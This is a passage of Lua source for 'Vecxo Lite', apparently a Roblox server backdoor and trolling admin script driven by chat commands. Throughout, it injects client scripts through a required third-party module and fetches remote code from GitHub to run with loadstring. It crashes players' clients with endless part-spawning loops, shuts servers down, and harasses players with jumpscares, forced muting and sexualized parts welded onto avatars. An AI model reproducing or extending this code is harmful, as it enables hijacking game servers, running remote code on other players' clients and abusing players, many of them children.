					GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
				end)
				table.remove(whitelisted, table.find(whitelisted, tostring(targetPlayer.UserId)))
				notify(sender, "[Vecko Lite]: ", "✅ Removed " .. targetPlayer.Name .. " from whitelist")
			else
				notifyv2(sender, "[Vecko Lite]: ", "❌ Protected user cannot be removed from the whitelist")
			end
		end
	elseif cmd == "!unhwl" and args[2] then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			if #targets == 0 then
				notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
				return
			end
			for _, targetPlayer in ipairs(targets) do
				if targetPlayer.Name ~= "Reloxz" then
					task.spawn(function()
						GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
					end)
					table.remove(exclusivewl, table.find(exclusivewl, targetPlayer.Name))
					table.remove(whitelisted, table.find(whitelisted, tostring(targetPlayer.UserId)))
					notify(sender, "[Vecko Lite]: ", "✅ Removed " .. targetPlayer.Name .. " from hard whitelist")
				else
					notifyv2(sender, "[Vecko Lite]: ", "❌ Protected user cannot be removed from the hard whitelist")
				end
			end
		end
	elseif cmd == "!restart" then
		local message = Instance.new("Message", workspace)
		local dots = 0
		local running = true
		task.spawn(function()
			while running do
				dots = (dots % 3) + 1
				message.Text = "[Vecxo Lite]: ✅ Restarting server" .. string.rep(".", dots)
				task.wait(0.3)
			end
		end)
		game.Players.PlayerAdded:Connect(function(v)
			repeat task.wait() until v and v.Character
			v:Kick("[Vecxo Lite]: ❌ This server was closed because someone triggered a new server creation.")
		end)
		local teleportService = game:GetService("TeleportService")
		local code = teleportService:ReserveServer(game.PlaceId)
		teleportService:TeleportToPrivateServer(game.PlaceId, code, game.Players:GetPlayers(), nil, {
			softshutdowned = true,
			vecxo = true
		})
		repeat
			task.wait(0.2)
		until #game.Players:GetPlayers() == 0
		running = false
		message:Destroy()
		while true do task.wait(.2)
			for _, v in ipairs(game.Players:GetPlayers()) do
				v:Kick("[Vecxo Lite]: ❌ Server has been shutdown.")
			end
		end
	elseif cmd == "!flashbang" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local flashbang = Instance.new("Frame", sgui)
			sgui.IgnoreGuiInset = true
			flashbang.Size = UDim2.new(1, 0, 1, 0)
			flashbang.Position = UDim2.new(0, 0, 0, 0)
			flashbang.BackgroundColor3 = Color3.new(255, 255, 255)
			flashbang.Visible = true
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://17659239587"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Flashbanged " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players sucessfully"))
	elseif cmd == "!crash" and args[2] then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Name ~= "Reloxz" then
				task.spawn(function()
					GraphicalEffects.CrystalRing(plr, "Really red", 2)
				end)
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112691275102014).load()
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
			task.spawn(function()
			while true do
					for i = 1, 1000000 do
						local a = Instance.new("Part", workspace)
						a.CFrame = CFrame.new(0, 5, 0)
						--a.Anchored = true
					end
					task.wait()
				end
			end)
			while true do end

			]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end 
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Crashed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players sucessfully"))
	elseif cmd == "!bclient" and args[2] then
		local targets = GetPlayers(args[2], sender)
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/troll")
		end)

		if not success then
			notifyv2(sender, "[Vecxo Lite]: ", "Failed to fetch code: " .. err)
			return
		end

		for _, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
			if not goog then
				warn("goog failed to be added, command cannot continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code -- inject downloaded code to client
			if plr.Character then
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Broke " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. "'s client successfully"))
	elseif cmd == "!mute" and args[2] then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if table.find(whitelisted, tostring(plr.UserId)) and sender.UserId ~= 36373784 then
				notifyv2(sender, "[Vecko Lite]: ", "❌ You cannot mute the admins of this script!")
			else
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112691275102014).load()
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notifyv2(sender, "[Vecko Lite]: ", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
				
					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)

					task.wait(0.3)
					script:Destroy()
				
				]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Muted " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " successfully"))
	elseif cmd == "!unmute" and args[2] then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notifyv2(sender, "[Vecxo Lite]: ", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
				script:Destroy()
			
			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Unmuted " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " successfully"))
	elseif cmd == "!sfakereq" and args[2] then
		local targets = GetPlayers(args[2], sender)
		local fakereqname = args[3]
		for i, plr in ipairs(targets) do
			_G.fakefriend(plr.Name, fakereqname)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Sent a fake friend request to  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully with fake name as "..fakereqname))
	elseif cmd == "!grabgun" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do

			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then

				_G.GunMan = plr.Name

				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112691275102014).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
				
				local Player = game:GetService("Players").LocalPlayer
				local Char = Player.Character
				local Event = Char:WaitForChild("UserInput_Event")
				local UIS = game:GetService("UserInputService")
				local input = function(io,a)
					if a then return end
					local io = {KeyCode=io.KeyCode,UserInputType=io.UserInputType,UserInputState=io.UserInputState}
					Event:FireServer(io)
				end
				UIS.InputBegan:Connect(input)
				UIS.InputEnded:Connect(input)
				local Changed = false
				local Mouse = Player:GetMouse()
				local h,t = Mouse.Hit,Mouse.Target
				while wait(1/30) do
					if h~=Mouse.Hit or t~=Mouse.Target then
						Event:FireServer({isMouse=true,Target=Mouse.Target,Hit=Mouse.Hit})
						h,t=Mouse.Hit,Mouse.Target
					end
				end

				]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true

				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112691275102014).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Server:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr

				local success, content = pcall(function() -- grab gun script
					return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/grabgun")
				end)

				if success and typeof(content) == "string" then
					local loaded, fail = loadstring(content)
					if loaded then
						scr:WaitForChild("Exec").Value = content
						if plr.Character then
							scr.Parent = plr.Character
						else
							scr.Parent = plr:WaitForChild("PlayerGui")
						end
						scr.Name = "GrabGunMain"
						scr.Enabled = true
						notifyv2(sender, "[Vecxo Lite]: ", "✅ Successfuly loaded the grab gun on "..plr.Name)
					else
						notifyv2(sender, "[Vecxo Lite]: ", "❌ Failed to load the grab gun: " .. tostring(fail))
					end
				else
					notifyv2(sender, "[Vecxo Lite]: ", "❌ Failed to load the grab gun")
				end
			end
		end
	elseif cmd == "!nukemap" then
		local InsertService = game:GetService("InsertService")
		local gearId = 88885539 -- Tactical Airstrike
		plr = sender
		local success, model = pcall(function()
			return InsertService:LoadAsset(gearId)
		end)

		if not success or not model then
			warn("Failed to load gear asset:", gearId)
			return
		end
		local baseTool = model:FindFirstChildOfClass("Tool")
		if not baseTool then
			warn("No Tool found in model")
			return
		end
		local backpack = sender:FindFirstChild("Backpack") or sender:WaitForChild("Backpack")
		notify(sender, "[Vecxo Lite]: ", "✅ Getting gears...")
		for i = 1, 460 do
			local clonedTool = baseTool:Clone()
			clonedTool.Parent = backpack -- allow some breathing room
		end
		local amount = 0
		repeat
			amount = 0
			local clonedTool = baseTool:Clone()
			clonedTool.Parent = backpack
			for i, v in pairs(sender.Backpack:GetChildren()) do
				if v.Name == "Tactical Airstrike" then
					amount = amount +1
				end
			end
			game:GetService("RunService").Heartbeat:wait()
		until amount >= 460
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/nukez")
		end)

		if not success then
			return
		end

		if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
			local ticking = tick()
			require(112691275102014).load()
			repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
		end

		local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
		if not goog then
			warn("goog failed to be added, command cannot continue")
			return
		end

		local scr = goog:FindFirstChild("Utilities").Client:Clone()
		local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

		loa.Parent = scr
		scr:WaitForChild("Exec").Value = code -- inject downloaded code to client
		if plr.Character then
			scr.Parent = plr:WaitForChild("PlayerGui")
		end
		scr.Enabled = true
	elseif cmd == "!to" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	elseif cmd == "!bring" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	elseif cmd == "!jork" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecko Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("Torso") then
					local tip = Instance.new("Part", plr.Character)
					local peep = Instance.new("Part", plr.Character)
					local ball1 = Instance.new("Part", plr.Character)
					local ball2 = Instance.new("Part", plr.Character)

					local tipmesh = Instance.new("SpecialMesh", tip)
					local peepmesh = Instance.new("CylinderMesh", peep)
					local ball1mesh = Instance.new("SpecialMesh", ball1)
					local ball2mesh = Instance.new("SpecialMesh", ball2)

					local tipweld = Instance.new("WeldConstraint", plr.Character)
					local peepweld = Instance.new("WeldConstraint", plr.Character)
					local peepweld2 = Instance.new("WeldConstraint", peep)
					local ball1weld = Instance.new("WeldConstraint", plr.Character)
					local ball2weld = Instance.new("WeldConstraint", plr.Character)

					tip.BrickColor = BrickColor.new("Pink")
					tip.Size = Vector3.new(1, 1, 1)
					tip.BottomSurface = "Smooth"
					tip.TopSurface = "Smooth"
					tip.CanCollide = false
					tip.Locked = true

					peep.Color = plr.Character.Torso.Color
					peep.Size = Vector3.new(0.4, 1.3, 0.4)
					peep.BottomSurface = "Smooth"
					peep.TopSurface = "Smooth"
					peep.CanCollide = false
					peep.Locked = true

					ball1.Color = plr.Character.Torso.Color
					ball1.Size = Vector3.new(1, 1, 1)
					ball1.BottomSurface = "Smooth"
					ball1.TopSurface = "Smooth"
					ball1.CanCollide = false
					ball1.Locked = true

					ball2.Color = plr.Character.Torso.Color
					ball2.Size = Vector3.new(1, 1, 1)
					ball2.BottomSurface = "Smooth"
					ball2.TopSurface = "Smooth"
					ball2.CanCollide = false
					ball2.Locked = true

					tipmesh.MeshType = "Sphere"
					tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)

					ball1mesh.MeshType = "Sphere"
					ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

					ball2mesh.MeshType = "Sphere"
					ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

					peep.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -1, -1.15) * CFrame.Angles(math.rad(90), 0, 0)
					tip.CFrame = peep.CFrame * CFrame.new(0, -0.65, 0)
					ball1.CFrame = peep.CFrame * CFrame.new(0.25, 0.6, 0.25)
					ball2.CFrame = peep.CFrame * CFrame.new(-0.25, 0.6, 0.25)

					tipweld.Part0 = plr.Character.Torso
					tipweld.Part1 = tip

					peepweld.Part0 = plr.Character.Torso
					peepweld.Part1 = peep

					peepweld2.Part0 = peep
					peepweld2.Part1 = tip

					ball1weld.Part0 = plr.Character.Torso
					ball1weld.Part1 = ball1

					ball2weld.Part0 = plr.Character.Torso
					ball2weld.Part1 = ball2

					local anim1 = Instance.new("Animation")
					anim1.AnimationId = "rbxassetid://72042024"
					local anim2 = Instance.new("Animation")
					anim2.AnimationId = "rbxassetid://168268306"
					local h = plr.Character:FindFirstChild("Humanoid")

					local track1 = h:LoadAnimation(anim1)
					local track2 = h:LoadAnimation(anim2)

					local length1 = track1.Length
					local length2 = track2.Length

					local restartPoint1 = length1 - 0.2
					local restartPoint2 = length2 - 0.2
					while true do
						track1:Play()
						track1.TimePosition = 0.4
						if track1.TimePosition >= restartPoint1 then
							track1.TimePosition = 0.4
						end
						track2:Play()
						track2.TimePosition = 0.5
						if track2.TimePosition >= restartPoint2 then
							track2.TimePosition = 0.5
						end
						wait(0.4)
					end
				end
			end
		end
	elseif cmd == "!jumpscare" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local scary = Instance.new("ImageLabel", sgui)

			scary.Size = UDim2.new(1,0,1.1,0)
			scary.BackgroundTransparency = 1
			scary.Image = "rbxassetid://13825687318"
			scary.ZIndex = 10
			scary.Visible = true

			sgui.IgnoreGuiInset = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://270145703"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Jumpscared  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully"))
	elseif cmd == "!findgear" then
		local targetKeyword = args[2]
		if not targetKeyword then
			notifyv2(sender, "[Vecxo Lite]: ", "Please specify a target (e.g. me) and gear name.")
			return
		end
		local targets = GetPlayers(targetKeyword, sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]: ", "No valid target players found.")
			return
		end
		local gearName = table.concat(args, " ", 3)
		if gearName == "" then
			notifyv2(sender, "[Vecxo Lite]: ", "Please specify the gear name.")
			return
		end
		local encodedGearName = game:GetService("HttpService"):UrlEncode(gearName)
		local url = "https://catalog.roproxy.com/v1/search/items?category=Accessories&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=Gear&Keyword=" .. encodedGearName

		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if data and data.data and #data.data > 0 then
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data.data[1].id)
			end)

			if success and gear then
				for _, plr in ipairs(targets) do
					local item = gear:FindFirstChildOfClass("Tool")
					if item then
						item.Parent = plr.Backpack
					else
						notifyv2(sender, "[Vecxo Lite]: ", "Gear asset does not contain a Tool.")
					end
				end
			else
				notifyv2(sender, "[Vecxo Lite]: ", "Failed to insert the gear.")
			end
		else
			notifyv2(sender, "[Vecxo Lite]: ", "No gear found matching that name.")
		end
	elseif cmd == "!perm" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			if table.find(_G.tempadmins, plr.Name) and not table.find(_G.permadmins, plr.Name) then
				table.insert(_G.permadmins, plr.Name)
			elseif not table.find(_G.permadmins, plr.Name) and not table.find(_G.tempadmins, plr.Name) then
				table.insert(_G.permadmins, plr.Name)
				table.insert(_G.tempadmins, plr.Name)
			else
				notifyv2(sender, "[Vecxo Lite]: ", "✅ "..plr.Name .." already has perm admin!")
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Gave perm to  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully"))
	elseif cmd == "!unperm" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Really red", 2)
			end)
			if table.find(_G.permadmins, plr.Name) then
				table.remove(_G.permadmins, table.find(_G.permadmins, plr.Name))
			end
			if table.find(_G.tempadmins, plr.Name) then
				table.remove(_G.tempadmins, table.find(_G.tempadmins, plr.Name))
			end
		end
	elseif cmd == "!p299" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			if not table.find(_G.p299, plr.Name) then
				table.insert(_G.p299, plr.Name)
			else
				notifyv2(sender, "[Vecxo Lite]: ", "✅ "..plr.Name .." already has person299 admin!")
			end
		end
	elseif cmd == "!unp299" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Really red", 2)
			end)
			if table.find(_G.p299, plr.Name) then
				table.remove(_G.p299, table.find(_G.p299, plr.Name))
			else
				notifyv2(sender, "[Vecxo Lite]: ", plr.Name .. " Doesn't have person299!")
			end
		end
	elseif cmd == "!f3x" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local success, err = pcall(function()
				require(2571067295).load(plr.Name)
			end)
		end
	elseif cmd == "!clyde" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local scary = Instance.new("ImageLabel", sgui)

			scary.Size = UDim2.new(1,0,1.1,0)
			scary.BackgroundTransparency = 1
			scary.Image = "rbxassetid://15637324487"
			scary.ZIndex = 10
			scary.Visible = true

			sgui.IgnoreGuiInset = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://270145703"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Put clyde on  " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players successfully"))
	elseif cmd == "!shutdown" then
		for i, v in pairs(game.Players:GetPlayers()) do
			v:Kick("[Vecxo Lite]: This server has been shutdown.")
		end
		game:Shutdown()
	elseif cmd == "!wls" then
		showWhitelisted(sender, whitelisted)
	elseif cmd == "!logs" then
		showChatLogs(sender)
	elseif cmd == "!hideobby" then
		for i, v in pairs(game.workspace:GetDescendants()) do
			if v.Name == "Tabby" then
				for z, x in pairs(v:GetDescendants()) do
					if x.Name == "Jump" or x.Name == "Jump1" or x.Name == "Jump2" or x.Name == "Jump3" or x.Name == "Jump4" or x.Name == "Jump5" or x.Name == "Jump6" or x.Name == "Jump7" or x.Name == "Jump8" or x.Name == "Jump9" or x.Name == "Barrier" and x:IsA("Part") then
						x.CanCollide = false
						x.CanTouch = false
						x.Transparency = 1
					end
				end
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ The obby is hidden successfully")
	elseif cmd == "!unhideobby" then
		for i, v in pairs(game.workspace:GetDescendants()) do
			if v.Name == "Tabby" then
				for z, x in pairs(v:GetDescendants()) do
					if x.Name == "Jump" or x.Name == "Jump1" or x.Name == "Jump2" or x.Name == "Jump3" or x.Name == "Jump4" or x.Name == "Jump5" or x.Name == "Jump6" or x.Name == "Jump7" or x.Name == "Jump8" or x.Name == "Jump9" or x.Name == "Barrier" and x:IsA("Part") then
						x.CanCollide = true
						x.CanTouch = true
						if x.Name == "Barrier" then
							x.Transparency = 0.6 
						else
							x.Transparency = 0
						end
					end
				end
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ The obby is unhidden successfully")
	elseif cmd == "!clr" then
		for _, v in pairs(game.Workspace:GetChildren()) do
			if (v:IsA("Part") or v:IsA("TrussPart") or v:IsA("WedgePart")) and v.Parent == game.Workspace then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetChildren()) do
			if v.Name ~= "Terrain" and (v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool")) then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetDescendants()) do
			if v.Name ~= "face" and (v:IsA("Decal") or v:IsA("ParticleEmitter")) then
				v:Destroy()
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Workspace cleared successfully")
	elseif cmd == "!unload" then
		scriptrunning = false
		local h = Instance.new("Hint", workspace)
		for i = 3, 1, -1 do
			h.Text = "[Vecxo Lite]: Unloading in ".. i .." seconds"
			task.wait(1)
		end
		h:Destroy()
		for i,v in pairs(vecxoconnections) do
			if typeof(v) ~= "function" then
				v:Disconnect()
			end
			vecxoconnections[i] = nil
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.PlayerGui then 
				if v.PlayerGui:FindFirstChild("VecxoCmds") then
					v.PlayerGui:FindFirstChild("VecxoCmds"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoWhitelisted") then
					v.PlayerGui:FindFirstChild("VecxoWhitelisted"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoBanned") then
					v.PlayerGui:FindFirstChild("VecxoBanned"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoCommandBar") then
					v.PlayerGui:FindFirstChild("VecxoCommandBar"):Destroy()
				end
			end
		end
		whitelisted = {}
		exclusivewl = {}
		bannedPlayers = {}
		vecxoconnections = {}
	elseif cmd == "!reloadscript" then
		scriptrunning = false
		local h = Instance.new("Hint", workspace)
		for i = 3, 1, -1 do
			h.Text = "[Vecxo Lite]: - ⚠️ Reloading in [ ".. i .." ] seconds"
			task.wait(1)
		end
		h:Destroy()
		for i,v in pairs(vecxoconnections) do
			if typeof(v) ~= "function" then
				v:Disconnect()
			end
			vecxoconnections[i] = nil
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.PlayerGui then 
				if v.PlayerGui:FindFirstChild("VecxoCmds") then
					v.PlayerGui:FindFirstChild("VecxoCmds"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoWhitelisted") then
					v.PlayerGui:FindFirstChild("VecxoWhitelisted"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoBanned") then
					v.PlayerGui:FindFirstChild("VecxoBanned"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoCommandBar") then
					v.PlayerGui:FindFirstChild("VecxoCommandBar"):Destroy()
				end
			end
		end
		whitelisted = {}
		bannedPlayers = {}
		vecxoconnections = {}
		exclusivewl = {}
		local h2 = Instance.new("Hint", workspace)
		h2.Text = "[Vecxo Lite]: - Unloaded successfully"
		task.wait(1)
		h2:Destroy()
		local message = Instance.new("Hint", workspace)
		local dots = 0
		local running = true
		local check = false
		task.spawn(function()
			while running do
				dots = (dots % 3) + 1
				message.Text = "[Vecxo Lite]: - ⚠️ Attempting to automatically reload" .. string.rep(".", dots)
				task.wait(0.3)
			end
		end)
		task.wait(.7)
		local httpService = game:GetService("HttpService")
		local source = httpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoLite")
		local func = loadstring(source)
		if not func then
			message:Destroy()
			local message2 = Instance.new("Hint", workspace)
			message2.Text = "[Vecxo Lite]: - Could not reload Vecxo Lite, HTTP 404 timed out"
			task.wait(3)
			message2:Destroy()
			return
		end
		task.spawn(func)
		message:Destroy()
